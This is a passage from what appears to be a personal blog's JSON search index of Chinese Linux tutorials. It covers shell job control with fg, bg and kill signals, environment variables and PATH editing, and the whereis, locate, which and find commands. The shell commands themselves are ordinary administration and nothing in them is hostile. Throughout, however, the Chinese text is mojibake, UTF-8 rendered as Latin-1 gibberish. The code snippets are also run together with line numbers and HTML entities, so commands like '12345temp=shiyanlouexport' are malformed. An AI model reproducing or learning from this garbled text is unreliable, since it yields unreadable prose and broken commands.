è¡¨ç¤ºæœ€è¿‘(åˆšåˆšã€æœ€å)è¢«æ”¾ç½®åå°çš„ jobï¼ŒåŒæ—¶ä¹Ÿè¡¨ç¤ºé¢„è®¾çš„å·¥ä½œï¼Œä¹Ÿå°±æ˜¯è‹¥æ˜¯æœ‰ä»€ä¹ˆé’ˆå¯¹åå° job çš„æ“ä½œï¼Œé¦–å…ˆå¯¹é¢„è®¾çš„ jobï¼Œ- è¡¨ç¤ºå€’æ•°ç¬¬äºŒï¼ˆä¹Ÿå°±æ˜¯åœ¨é¢„è®¾ä¹‹å‰çš„ä¸€ä¸ªï¼‰è¢«æ”¾ç½®åå°çš„å·¥ä½œï¼Œå€’æ•°ç¬¬ä¸‰ä¸ªï¼ˆå†ä¹‹å‰çš„ï¼‰ä»¥åéƒ½ä¸ä¼šæœ‰è¿™æ ·çš„ç¬¦å·ä¿®é¥°ï¼Œç¬¬ä¸‰åˆ—è¡¨ç¤ºå®ƒä»¬çš„çŠ¶æ€ï¼Œè€Œæœ€åä¸€åˆ—è¡¨ç¤ºè¯¥è¿›ç¨‹æ‰§è¡Œçš„å‘½ä»¤ æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™æ ·çš„ä¸€ä¸ªå‘½ä»¤å°†åå°çš„å·¥ä½œæ‹¿åˆ°å‰å°æ¥ 123#åé¢ä¸åŠ å‚æ•°æå–é¢„è®¾å·¥ä½œï¼ŒåŠ å‚æ•°æå–æŒ‡å®šå·¥ä½œçš„ç¼–å·#ubuntu åœ¨ zsh ä¸­éœ€è¦ %ï¼Œåœ¨ bash ä¸­ä¸éœ€è¦ %fg [%jobnumber] ä¹‹å‰æˆ‘ä»¬é€šè¿‡ ctrl + z ä½¿å¾—å·¥ä½œåœæ­¢æ”¾ç½®åœ¨åå°ï¼Œè‹¥æ˜¯æˆ‘ä»¬æƒ³è®©å…¶åœ¨åå°è¿ä½œæˆ‘ä»¬å°±ä½¿ç”¨è¿™æ ·ä¸€ä¸ªå‘½ä»¤ 12#ä¸fgç±»ä¼¼ï¼ŒåŠ å‚åˆ™æŒ‡å®šï¼Œä¸åŠ å‚åˆ™å–é¢„è®¾bg [%jobnumber] æ—¢ç„¶æœ‰æ–¹æ³•å°†è¢«æ”¾ç½®åœ¨åå°çš„å·¥ä½œæè‡³å‰å°æˆ–è€…è®©å®ƒä»åœæ­¢å˜æˆç»§ç»­è¿è¡Œåœ¨åå°ï¼Œå½“ç„¶ä¹Ÿæœ‰æ–¹æ³•åˆ é™¤ä¸€ä¸ªå·¥ä½œï¼Œæˆ–è€…é‡å¯ç­‰ç­‰ 12345#killçš„ä½¿ç”¨æ ¼å¼å¦‚ä¸‹kill -signal %jobnumber#signalä»1-64ä¸ªä¿¡å·å€¼å¯ä»¥é€‰æ‹©ï¼Œå¯ä»¥è¿™æ ·æŸ¥çœ‹kill ï¼l å…¶ä¸­å¸¸ç”¨çš„æœ‰è¿™äº›ä¿¡å·å€¼ ä¿¡å·å€¼ ä½œç”¨ -1 é‡æ–°è¯»å–å‚æ•°è¿è¡Œï¼Œç±»ä¼¼ä¸restart -2 å¦‚åŒ ctrl+c çš„æ“ä½œé€€å‡º -9 å¼ºåˆ¶ç»ˆæ­¢è¯¥ä»»åŠ¡ -15 æ­£å¸¸çš„æ–¹å¼ç»ˆæ­¢è¯¥ä»»åŠ¡ æ³¨æ„ è‹¥æ˜¯åœ¨ä½¿ç”¨killï¼‹ä¿¡å·å€¼ç„¶åç›´æ¥åŠ  pidï¼Œä½ å°†ä¼šå¯¹ pid å¯¹åº”çš„è¿›ç¨‹è¿›è¡Œæ“ä½œ è‹¥æ˜¯åœ¨ä½¿ç”¨kill+ä¿¡å·å€¼ç„¶å ï¼…jobnumberï¼Œè¿™æ—¶æ‰€æ“ä½œçš„å¯¹è±¡æ˜¯ jobï¼Œè¿™ä¸ªæ•°å­—å°±æ˜¯å°±å½“å‰ bash ä¸­åå°çš„è¿è¡Œçš„ job çš„ ID","tags":[{"name":"Linux","slug":"Linux","permalink":"https://hodlyounger.github.io/tags/Linux/"},{"name":"è¿›ç¨‹","slug":"è¿›ç¨‹","permalink":"https://hodlyounger.github.io/tags/%E8%BF%9B%E7%A8%8B/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"æ“ä½œç³»ç»ŸåŠLinuxå†…æ ¸","slug":"A-OS/Linux/æ“ä½œç³»ç»ŸåŠLinuxå†…æ ¸","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8F%8ALinux%E5%86%85%E6%A0%B8/"}]},{"title":"Linux å¯¼è¯»å¤§çº²","date":"2023-10-27T01:24:01.891Z","path":"A_OS/Linux/readme/","text":"å‘½ä»¤è¡Œå’Œå·¥å…· LinuxåŸºç¡€å…¥é—¨ Linuxå†…æ ¸åˆ†æé…å¥—å®éªŒ Linux RPC","tags":[{"name":"Linux","slug":"Linux","permalink":"https://hodlyounger.github.io/tags/Linux/"},{"name":"å¯¼è¯»","slug":"å¯¼è¯»","permalink":"https://hodlyounger.github.io/tags/%E5%AF%BC%E8%AF%BB/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"}]},{"title":"RPC","date":"2023-10-27T01:24:01.889Z","path":"A_OS/Linux/RPC/ã€Linuxã€‘RPC/","text":"","tags":[{"name":"linux","slug":"linux","permalink":"https://hodlyounger.github.io/tags/linux/"},{"name":"rpc","slug":"rpc","permalink":"https://hodlyounger.github.io/tags/rpc/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"RPC","slug":"A-OS/Linux/RPC","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/RPC/"}]},{"title":"Linux åŸºç¡€å…¥é—¨","date":"2023-10-27T01:24:01.845Z","path":"A_OS/Linux/LinuxåŸºç¡€å…¥é—¨/Readme/","text":"å®éªŒæ¥¼ Linux åŸºç¡€å…¥é—¨å­¦ä¹ æ•´ç† linux åŸºç¡€å…¥é—¨ 5 ç¯å¢ƒå˜é‡ä¸æ–‡ä»¶æŸ¥æ‰¾ 15 Linux è¿›ç¨‹æ¦‚å¿µ","tags":[{"name":"Linux","slug":"Linux","permalink":"https://hodlyounger.github.io/tags/Linux/"},{"name":"å†…æ ¸","slug":"å†…æ ¸","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"LinuxåŸºç¡€å…¥é—¨","slug":"A-OS/Linux/LinuxåŸºç¡€å…¥é—¨","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Linux%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]},{"title":"5 ç¯å¢ƒå˜é‡ä¸æ–‡ä»¶æŸ¥æ‰¾","date":"2023-10-27T01:24:01.844Z","path":"A_OS/Linux/LinuxåŸºç¡€å…¥é—¨/5 ç¯å¢ƒå˜é‡ä¸æ–‡ä»¶æŸ¥æ‰¾/","text":"[toc] 1. ç¯å¢ƒå˜é‡ ç®€å•ç†è§£äº†å˜é‡çš„æ¦‚å¿µï¼Œå°±å¾ˆå®¹æ˜“ç†è§£ç¯å¢ƒå˜é‡äº†ã€‚ç¯å¢ƒå˜é‡çš„ä½œç”¨åŸŸæ¯”è‡ªå®šä¹‰å˜é‡çš„è¦å¤§ï¼Œå¦‚ Shell çš„ç¯å¢ƒå˜é‡ä½œç”¨äºè‡ªèº«å’Œå®ƒçš„å­è¿›ç¨‹ã€‚åœ¨æ‰€æœ‰çš„ UNIX å’Œç±» UNIX ç³»ç»Ÿä¸­ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰å…¶å„è‡ªçš„ç¯å¢ƒå˜é‡è®¾ç½®ï¼Œä¸”é»˜è®¤æƒ…å†µä¸‹ï¼Œå½“ä¸€ä¸ªè¿›ç¨‹è¢«åˆ›å»ºæ—¶ï¼Œé™¤äº†åˆ›å»ºè¿‡ç¨‹ä¸­æ˜ç¡®æŒ‡å®šçš„è¯ï¼Œå®ƒå°†ç»§æ‰¿å…¶çˆ¶è¿›ç¨‹çš„ç»å¤§éƒ¨åˆ†ç¯å¢ƒè®¾ç½®ã€‚Shell ç¨‹åºä¹Ÿä½œä¸ºä¸€ä¸ªè¿›ç¨‹è¿è¡Œåœ¨æ“ä½œç³»ç»Ÿä¹‹ä¸Šï¼Œè€Œæˆ‘ä»¬åœ¨ Shell ä¸­è¿è¡Œçš„å¤§éƒ¨åˆ†å‘½ä»¤éƒ½å°†ä»¥ Shell çš„å­è¿›ç¨‹çš„æ–¹å¼è¿è¡Œã€‚ é€šå¸¸æˆ‘ä»¬ä¼šæ¶‰åŠåˆ°çš„å˜é‡ç±»å‹æœ‰ä¸‰ç§ï¼š å½“å‰ Shell è¿›ç¨‹ç§æœ‰ç”¨æˆ·è‡ªå®šä¹‰å˜é‡ï¼Œå¦‚ä¸Šé¢æˆ‘ä»¬åˆ›å»ºçš„ tmp å˜é‡ï¼Œåªåœ¨å½“å‰ Shell ä¸­æœ‰æ•ˆã€‚ Shell æœ¬èº«å†…å»ºçš„å˜é‡ã€‚ ä»è‡ªå®šä¹‰å˜é‡å¯¼å‡ºçš„ç¯å¢ƒå˜é‡ã€‚ ä¹Ÿæœ‰ä¸‰ä¸ªä¸ä¸Šè¿°ä¸‰ç§ç¯å¢ƒå˜é‡ç›¸å…³çš„å‘½ä»¤ï¼šsetï¼Œenvï¼Œexportã€‚è¿™ä¸‰ä¸ªå‘½ä»¤å¾ˆç›¸ä¼¼ï¼Œéƒ½æ˜¯ç”¨äºæ‰“å°ç¯å¢ƒå˜é‡ä¿¡æ¯ï¼ŒåŒºåˆ«åœ¨äºæ¶‰åŠçš„å˜é‡èŒƒå›´ä¸åŒã€‚è¯¦è§ä¸‹è¡¨ï¼š å‘½ ä»¤ è¯´ æ˜ set æ˜¾ç¤ºå½“å‰ Shell æ‰€æœ‰å˜é‡ï¼ŒåŒ…æ‹¬å…¶å†…å»ºç¯å¢ƒå˜é‡ï¼ˆä¸ Shell å¤–è§‚ç­‰ç›¸å…³ï¼‰ï¼Œç”¨æˆ·è‡ªå®šä¹‰å˜é‡åŠå¯¼å‡ºçš„ç¯å¢ƒå˜é‡ã€‚ env æ˜¾ç¤ºä¸å½“å‰ç”¨æˆ·ç›¸å…³çš„ç¯å¢ƒå˜é‡ï¼Œè¿˜å¯ä»¥è®©å‘½ä»¤åœ¨æŒ‡å®šç¯å¢ƒä¸­è¿è¡Œã€‚ export æ˜¾ç¤ºä» Shell ä¸­å¯¼å‡ºæˆç¯å¢ƒå˜é‡çš„å˜é‡ï¼Œä¹Ÿèƒ½é€šè¿‡å®ƒå°†è‡ªå®šä¹‰å˜é‡å¯¼å‡ºä¸ºç¯å¢ƒå˜é‡ã€‚ ä½ å¯ä»¥æ›´ç›´è§‚çš„ä½¿ç”¨ vimdiff å·¥å…·æ¯”è¾ƒä¸€ä¸‹å®ƒä»¬ä¹‹é—´çš„å·®åˆ«ï¼š 12345temp=shiyanlouexport temp_env=shiyanlouenv|sort&gt;env.txtexport|sort&gt;export.txtset|sort&gt;set.txt ä¸Šè¿°æ“ä½œå°†å‘½ä»¤è¾“å‡ºé€šè¿‡ç®¡é“ | ä½¿ç”¨ sort å‘½ä»¤æ’åºï¼Œå†é‡å®šå‘åˆ°å¯¹è±¡æ–‡æœ¬æ–‡ä»¶ä¸­ã€‚ç®¡é“çš„æ¦‚å¿µåé¢æˆ‘ä»¬ä¼šå­¦åˆ°ï¼Œç°åœ¨ä½ çŸ¥é“è¿™æ˜¯ä»€ä¹ˆæ„æ€å°±è¡Œäº†ã€‚ 1vimdiff env.txt export.txt set.txt ä½¿ç”¨ vimdiff å·¥å…·æ¯”è¾ƒå¯¼å‡ºçš„å‡ ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œé€€å‡º vimdiff éœ€è¦æŒ‰ä¸‹ Esc åè¾“å…¥ :q å³å¯é€€å‡ºã€‚ å…³äºå“ªäº›å˜é‡æ˜¯ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥ç®€å•åœ°ç†è§£æˆåœ¨å½“å‰è¿›ç¨‹çš„å­è¿›ç¨‹æœ‰æ•ˆåˆ™ä¸ºç¯å¢ƒå˜é‡ï¼Œå¦åˆ™ä¸æ˜¯ï¼ˆæœ‰äº›äººä¹Ÿå°†æ‰€æœ‰å˜é‡ç»Ÿç§°ä¸ºç¯å¢ƒå˜é‡ï¼Œåªæ˜¯ä»¥å…¨å±€ç¯å¢ƒå˜é‡å’Œå±€éƒ¨ç¯å¢ƒå˜é‡è¿›è¡ŒåŒºåˆ†ï¼Œæˆ‘ä»¬åªè¦ç†è§£å®ƒä»¬çš„å®è´¨åŒºåˆ«å³å¯ï¼‰ã€‚æˆ‘ä»¬è¿™é‡Œç”¨ export å‘½ä»¤æ¥ä½“ä¼šä¸€ä¸‹ï¼Œå…ˆåœ¨ Shell ä¸­è®¾ç½®ä¸€ä¸ªå˜é‡ temp=shiyanlouï¼Œç„¶åå†æ–°åˆ›å»ºä¸€ä¸ªå­ Shell æŸ¥çœ‹ temp å˜é‡çš„å€¼ï¼š æ³¨æ„ï¼šä¸ºäº†ä¸æ™®é€šå˜é‡åŒºåˆ†ï¼Œé€šå¸¸æˆ‘ä»¬ä¹ æƒ¯å°†ç¯å¢ƒå˜é‡åè®¾ä¸ºå¤§å†™ã€‚ æ°¸ä¹…ç”Ÿæ•ˆ ä½†æ˜¯é—®é¢˜æ¥äº†ï¼Œå½“ä½ å…³æœºåï¼Œæˆ–è€…å…³é—­å½“å‰çš„ shell ä¹‹åï¼Œç¯å¢ƒå˜é‡å°±æ²¡äº†å•Šã€‚æ€ä¹ˆæ‰èƒ½è®©ç¯å¢ƒå˜é‡æ°¸ä¹…ç”Ÿæ•ˆå‘¢ï¼Ÿ æŒ‰å˜é‡çš„ç”Ÿå­˜å‘¨æœŸæ¥åˆ’åˆ†ï¼ŒLinux å˜é‡å¯åˆ†ä¸ºä¸¤ç±»ï¼š æ°¸ä¹…çš„ï¼šéœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå˜é‡æ°¸ä¹…ç”Ÿæ•ˆï¼› ä¸´æ—¶çš„ï¼šä½¿ç”¨ export å‘½ä»¤è¡Œå£°æ˜å³å¯ï¼Œå˜é‡åœ¨å…³é—­ shell æ—¶å¤±æ•ˆã€‚ è¿™é‡Œä»‹ç»ä¸¤ä¸ªé‡è¦æ–‡ä»¶ /etc/bashrcï¼ˆæœ‰çš„ Linux æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼‰ å’Œ /etc/profile ï¼Œå®ƒä»¬åˆ†åˆ«å­˜æ”¾çš„æ˜¯ shell å˜é‡å’Œç¯å¢ƒå˜é‡ã€‚è¿˜æœ‰è¦æ³¨æ„åŒºåˆ«çš„æ˜¯æ¯ä¸ªç”¨æˆ·ç›®å½•ä¸‹çš„ä¸€ä¸ªéšè—æ–‡ä»¶ï¼š 123# .profile å¯ä»¥ç”¨ ls -a æŸ¥çœ‹cd /home/shiyanlouls -a è¿™ä¸ª .profile åªå¯¹å½“å‰ç”¨æˆ·æ°¸ä¹…ç”Ÿæ•ˆã€‚å› ä¸ºå®ƒä¿å­˜åœ¨å½“å‰ç”¨æˆ·çš„ Home ç›®å½•ä¸‹ï¼Œå½“åˆ‡æ¢ç”¨æˆ·æ—¶ï¼Œå·¥ä½œç›®å½•å¯èƒ½ä¸€å¹¶è¢«åˆ‡æ¢åˆ°å¯¹åº”çš„ç›®å½•ä¸­ï¼Œè¿™ä¸ªæ–‡ä»¶å°±æ— æ³•ç”Ÿæ•ˆã€‚è€Œå†™åœ¨ /etc/profile é‡Œé¢çš„æ˜¯å¯¹æ‰€æœ‰ç”¨æˆ·æ°¸ä¹…ç”Ÿæ•ˆï¼Œæ‰€ä»¥å¦‚æœæƒ³è¦æ·»åŠ ä¸€ä¸ªæ°¸ä¹…ç”Ÿæ•ˆçš„ç¯å¢ƒå˜é‡ï¼Œåªéœ€è¦æ‰“å¼€ /etc/profileï¼Œåœ¨æœ€ååŠ ä¸Šä½ æƒ³æ·»åŠ çš„ç¯å¢ƒå˜é‡å°±å¥½å•¦ã€‚ 1. å‘½ä»¤çš„æŸ¥æ‰¾è·¯å¾„ä¸é¡ºåº æŸ¥çœ‹ PATH ç¯å¢ƒå˜é‡çš„å†…å®¹ï¼š 1echo $PATH é»˜è®¤æƒ…å†µä¸‹ä½ ä¼šçœ‹åˆ°å¦‚ä¸‹è¾“å‡ºï¼š 1/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games å¦‚æœä½ è¿˜è®°å¾— Linux ç›®å½•ç»“æ„é‚£ä¸€èŠ‚çš„å†…å®¹ï¼Œä½ å°±åº”è¯¥çŸ¥é“ä¸Šé¢è¿™äº›ç›®å½•ä¸‹æ”¾çš„æ˜¯å“ªä¸€ç±»æ–‡ä»¶äº†ã€‚é€šå¸¸è¿™ä¸€ç±»ç›®å½•ä¸‹æ”¾çš„éƒ½æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå½“æˆ‘ä»¬åœ¨ Shell ä¸­æ‰§è¡Œä¸€ä¸ªå‘½ä»¤æ—¶ï¼Œç³»ç»Ÿå°±ä¼šæŒ‰ç…§ PATH ä¸­è®¾å®šçš„è·¯å¾„æŒ‰ç…§é¡ºåºä¾æ¬¡åˆ°ç›®å½•ä¸­å»æŸ¥æ‰¾ï¼Œå¦‚æœå­˜åœ¨åŒåçš„å‘½ä»¤ï¼Œåˆ™æ‰§è¡Œå…ˆæ‰¾åˆ°çš„é‚£ä¸ªã€‚ 2 æ·»åŠ è‡ªå®šä¹‰è·¯å¾„åˆ° PATH ç¯å¢ƒå˜é‡ åœ¨å‰é¢æˆ‘ä»¬åº”è¯¥æ³¨æ„åˆ° PATH é‡Œé¢çš„è·¯å¾„æ˜¯ä»¥ : ä½œä¸ºåˆ†å‰²ç¬¦çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿™æ ·æ·»åŠ è‡ªå®šä¹‰è·¯å¾„ï¼š 1PATH=$PATH:/home/shiyanlou/mybin æ³¨æ„è¿™é‡Œä¸€å®šè¦ä½¿ç”¨ç»å¯¹è·¯å¾„ã€‚ 3 ä¿®æ”¹å’Œåˆ é™¤å·²æœ‰å˜é‡ å˜é‡ä¿®æ”¹ å˜é‡çš„ä¿®æ”¹æœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š å˜é‡è®¾ç½®æ–¹å¼ è¯´æ˜ $&#123;å˜é‡å#åŒ¹é…å­—ä¸²&#125; ä»å¤´å‘åå¼€å§‹åŒ¹é…ï¼Œåˆ é™¤ç¬¦åˆåŒ¹é…å­—ä¸²çš„æœ€çŸ­æ•°æ® $&#123;å˜é‡å##åŒ¹é…å­—ä¸²&#125; ä»å¤´å‘åå¼€å§‹åŒ¹é…ï¼Œåˆ é™¤ç¬¦åˆåŒ¹é…å­—ä¸²çš„æœ€é•¿æ•°æ® $&#123;å˜é‡å%åŒ¹é…å­—ä¸²&#125; ä»å°¾å‘å‰å¼€å§‹åŒ¹é…ï¼Œåˆ é™¤ç¬¦åˆåŒ¹é…å­—ä¸²çš„æœ€çŸ­æ•°æ® $&#123;å˜é‡å%%åŒ¹é…å­—ä¸²&#125; ä»å°¾å‘å‰å¼€å§‹åŒ¹é…ï¼Œåˆ é™¤ç¬¦åˆåŒ¹é…å­—ä¸²çš„æœ€é•¿æ•°æ® $&#123;å˜é‡å/æ—§çš„å­—ä¸²/æ–°çš„å­—ä¸²&#125; å°†ç¬¦åˆæ—§å­—ä¸²çš„ç¬¬ä¸€ä¸ªå­—ä¸²æ›¿æ¢ä¸ºæ–°çš„å­—ä¸² $&#123;å˜é‡å//æ—§çš„å­—ä¸²/æ–°çš„å­—ä¸²&#125; å°†ç¬¦åˆæ—§å­—ä¸²çš„å…¨éƒ¨å­—ä¸²æ›¿æ¢ä¸ºæ–°çš„å­—ä¸² æ¯”å¦‚æˆ‘ä»¬å¯ä»¥ä¿®æ”¹å‰é¢æ·»åŠ åˆ° PATH çš„ç¯å¢ƒå˜é‡ï¼Œå°†æ·»åŠ çš„ mybin ç›®å½•ä»ç¯å¢ƒå˜é‡é‡Œåˆ é™¤ã€‚ä¸ºäº†é¿å…æ“ä½œå¤±è¯¯å¯¼è‡´å‘½ä»¤æ‰¾ä¸åˆ°ï¼Œæˆ‘ä»¬å…ˆå°† PATH èµ‹å€¼ç»™ä¸€ä¸ªæ–°çš„è‡ªå®šä¹‰å˜é‡ mypathï¼š 12345mypath=$PATHecho $mypathmypath=$&#123;mypath%/home/shiyanlou/mybin&#125;# æˆ–ä½¿ç”¨é€šé…ç¬¦ * è¡¨ç¤ºä»»æ„å¤šä¸ªä»»æ„å­—ç¬¦mypath=$&#123;mypath%*/mybin&#125; å¯ä»¥çœ‹åˆ°è·¯å¾„å·²ç»ä¸å­˜åœ¨äº†ã€‚ å˜é‡åˆ é™¤ å¯ä»¥ä½¿ç”¨ unset å‘½ä»¤åˆ é™¤ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼š 1unset mypath 4 è®©ç¯å¢ƒå˜é‡ç«‹å³ç”Ÿæ•ˆ å‰é¢æˆ‘ä»¬åœ¨ Shell ä¸­ä¿®æ”¹äº†ä¸€ä¸ªé…ç½®è„šæœ¬æ–‡ä»¶ä¹‹åï¼ˆæ¯”å¦‚ zsh çš„é…ç½®æ–‡ä»¶ home ç›®å½•ä¸‹çš„ .zshrcï¼‰ï¼Œæ¯æ¬¡éƒ½è¦é€€å‡ºç»ˆç«¯é‡æ–°æ‰“å¼€ç”šè‡³é‡å¯ä¸»æœºä¹‹åå…¶æ‰èƒ½ç”Ÿæ•ˆï¼Œå¾ˆæ˜¯éº»çƒ¦ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ source å‘½ä»¤æ¥è®©å…¶ç«‹å³ç”Ÿæ•ˆï¼Œå¦‚ï¼š 12cd /home/shiyanlousource .zshrc source å‘½ä»¤è¿˜æœ‰ä¸€ä¸ªåˆ«åå°±æ˜¯ .ï¼Œä¸Šé¢çš„å‘½ä»¤å¦‚æœæ›¿æ¢æˆ . çš„æ–¹å¼å°±è¯¥æ˜¯ï¼š 1. ./.zshrc åœ¨ä½¿ç”¨ . çš„æ—¶å€™ï¼Œéœ€è¦æ³¨æ„ä¸è¡¨ç¤ºå½“å‰è·¯å¾„çš„é‚£ä¸ªç‚¹åŒºåˆ†å¼€ã€‚ æ³¨æ„ç¬¬ä¸€ä¸ªç‚¹åé¢æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œè€Œä¸”åé¢çš„æ–‡ä»¶å¿…é¡»æŒ‡å®šå®Œæ•´çš„ç»å¯¹æˆ–ç›¸å¯¹è·¯å¾„åï¼Œsource åˆ™ä¸éœ€è¦ã€‚ 2 æœç´¢æ–‡ä»¶ ä¸æœç´¢ç›¸å…³çš„å‘½ä»¤å¸¸ç”¨çš„æœ‰ whereisï¼Œwhichï¼Œfind å’Œ locateã€‚ whereis ç®€å•å¿«é€Ÿ 12whereis whowhereis find ä½ ä¼šçœ‹åˆ° whereis find æ‰¾åˆ°äº†ä¸‰ä¸ªè·¯å¾„ï¼Œä¸¤ä¸ªå¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„å’Œä¸€ä¸ª man åœ¨çº¿å¸®åŠ©æ–‡ä»¶æ‰€åœ¨è·¯å¾„ï¼Œè¿™ä¸ªæœç´¢å¾ˆå¿«ï¼Œå› ä¸ºå®ƒå¹¶æ²¡æœ‰ä»ç¡¬ç›˜ä¸­ä¾æ¬¡æŸ¥æ‰¾ï¼Œè€Œæ˜¯ç›´æ¥ä»æ•°æ®åº“ä¸­æŸ¥è¯¢ã€‚ whereis åªèƒ½æœç´¢äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆ-bï¼‰ï¼Œman å¸®åŠ©æ–‡ä»¶ï¼ˆ-mï¼‰å’Œæºä»£ç æ–‡ä»¶ï¼ˆ-sï¼‰ã€‚å¦‚æœæƒ³è¦è·å¾—æ›´å…¨é¢çš„æœç´¢ç»“æœå¯ä»¥ä½¿ç”¨ locate å‘½ä»¤ã€‚ locate å¿«è€Œå…¨ ä½¿ç”¨ locate å‘½ä»¤æŸ¥æ‰¾æ–‡ä»¶ä¹Ÿä¸ä¼šéå†ç¡¬ç›˜ï¼Œå®ƒé€šè¿‡æŸ¥è¯¢ /var/lib/mlocate/mlocate.db æ•°æ®åº“æ¥æ£€ç´¢ä¿¡æ¯ã€‚ä¸è¿‡è¿™ä¸ªæ•°æ®åº“ä¹Ÿä¸æ˜¯å®æ—¶æ›´æ–°çš„ï¼Œç³»ç»Ÿä¼šä½¿ç”¨å®šæ—¶ä»»åŠ¡æ¯å¤©è‡ªåŠ¨æ‰§è¡Œ updatedb å‘½ä»¤æ¥æ›´æ–°æ•°æ®åº“ã€‚æ‰€ä»¥æœ‰æ—¶å€™ä½ åˆšæ·»åŠ çš„æ–‡ä»¶ï¼Œå®ƒå¯èƒ½ä¼šæ‰¾ä¸åˆ°ï¼Œéœ€è¦æ‰‹åŠ¨æ‰§è¡Œä¸€æ¬¡ updatedb å‘½ä»¤ï¼ˆåœ¨æˆ‘ä»¬çš„ç¯å¢ƒä¸­å¿…é¡»å…ˆæ‰§è¡Œä¸€æ¬¡è¯¥å‘½ä»¤ï¼‰ã€‚æ³¨æ„è¿™ä¸ªå‘½ä»¤ä¹Ÿä¸æ˜¯å†…ç½®çš„å‘½ä»¤ï¼Œåœ¨éƒ¨åˆ†ç¯å¢ƒä¸­éœ€è¦æ‰‹åŠ¨å®‰è£…ï¼Œç„¶åæ‰§è¡Œæ›´æ–°ã€‚ 123sudo apt-get updatesudo apt-get install locatesudo updatedb å®ƒå¯ä»¥ç”¨æ¥æŸ¥æ‰¾æŒ‡å®šç›®å½•ä¸‹çš„ä¸åŒæ–‡ä»¶ç±»å‹ï¼Œå¦‚æŸ¥æ‰¾ /etc ä¸‹æ‰€æœ‰ä»¥ sh å¼€å¤´çš„æ–‡ä»¶ï¼š 1locate /etc/sh æ³¨æ„ï¼Œå®ƒä¸åªæ˜¯åœ¨ /etc ç›®å½•ä¸‹æŸ¥æ‰¾ï¼Œè¿˜ä¼šè‡ªåŠ¨é€’å½’å­ç›®å½•è¿›è¡ŒæŸ¥æ‰¾ã€‚ æŸ¥æ‰¾ /usr/share/ ä¸‹æ‰€æœ‰ jpg æ–‡ä»¶ï¼š 1locate /usr/share/*.jpg ç¯å¢ƒé‡Œä½¿ç”¨ zshï¼Œåœ¨ ~/.zshrc æ–‡ä»¶é‡Œæ·»åŠ äº† setopt nonomatch é…ç½®ï¼Œè¿™æ ·å°±ä¸ä¼šè‡ªåŠ¨å¤„ç†å’Œä¿®å¤å‘½ä»¤ï¼Œå› æ­¤å¯ä»¥ä¸ä½¿ç”¨ \\ è½¬ä¹‰ã€‚å¦‚æœå…¶ä»–ç¯å¢ƒä¸­æ‰§è¡Œè¯¥å‘½ä»¤æç¤º zsh: no matches found: /usr/share/*.jpgï¼Œåˆ™å¯ä»¥åœ¨ .zshrc ä¸­æ·»åŠ ä¸Šè¿°é…ç½®ï¼Œæˆ–è€…ä½¿ç”¨ \\ è½¬ä¹‰ã€‚ å¦‚æœæƒ³åªç»Ÿè®¡æ•°ç›®å¯ä»¥åŠ ä¸Š -c å‚æ•°ï¼Œ-i å‚æ•°å¯ä»¥å¿½ç•¥å¤§å°å†™è¿›è¡ŒæŸ¥æ‰¾ï¼Œwhereis çš„ -bã€-mã€-s åŒæ ·å¯ä»¥ä½¿ç”¨ã€‚ which å°è€Œç²¾ which æœ¬èº«æ˜¯ Shell å†…å»ºçš„ä¸€ä¸ªå‘½ä»¤ï¼Œæˆ‘ä»¬é€šå¸¸ä½¿ç”¨ which æ¥ç¡®å®šæ˜¯å¦å®‰è£…äº†æŸä¸ªæŒ‡å®šçš„ç¨‹åºï¼Œå› ä¸ºå®ƒåªä» PATH ç¯å¢ƒå˜é‡æŒ‡å®šçš„è·¯å¾„ä¸­å»æœç´¢å‘½ä»¤å¹¶ä¸”è¿”å›ç¬¬ä¸€ä¸ªæœç´¢åˆ°çš„ç»“æœã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æŸä¸ªç³»ç»Ÿå‘½ä»¤æ˜¯å¦å­˜åœ¨ä»¥åŠæ‰§è¡Œçš„åˆ°åº•æ˜¯å“ªä¸€ä¸ªåœ°æ–¹çš„å‘½ä»¤ã€‚ 123which manwhich nginxwhich ping find ç²¾è€Œç»† find åº”è¯¥æ˜¯è¿™å‡ ä¸ªå‘½ä»¤ä¸­æœ€å¼ºå¤§çš„äº†ï¼Œå®ƒä¸ä½†å¯ä»¥é€šè¿‡æ–‡ä»¶ç±»å‹ã€æ–‡ä»¶åè¿›è¡ŒæŸ¥æ‰¾è€Œä¸”å¯ä»¥æ 